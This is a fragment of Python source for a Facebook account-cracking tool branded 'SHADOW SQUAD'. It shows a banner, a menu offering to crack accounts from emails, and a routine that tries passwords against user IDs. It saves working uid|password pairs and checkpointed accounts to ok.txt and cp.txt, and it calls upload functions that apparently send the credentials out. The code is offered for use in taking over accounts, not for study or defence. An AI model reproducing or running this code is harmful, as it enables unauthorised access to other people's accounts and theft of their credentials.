...
\33[1;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[1;34m█  \33[mGithub: https://github.com/\33[1;32mSHADOW-SQUAD-BROTHEr
\33[1;34m█  \33[mFacebook: \33[1;32mSHADOW SQUAD - SS
\33[1;34m█  \33[mModifier: \33[1;32m Adnan Islam
...
\33[1;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
    """)
		...
		print("%s [%s04%s]%s CRACK FROM EMAILS %s(PRO) [Normal - AD4NAN]"%(R,G,R,Y,G))
		print(GET)
		hoga = input("\n%s [?] CHOICE : "%(B))
		if hoga in ["", " "]:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SHADOW_OLD] : %s/%s -> \033[0;92m [ SHADOW-OK:%s ]- \033[0;91m[SHADOW-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [SHADOW-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[Bcz-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Bcz-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
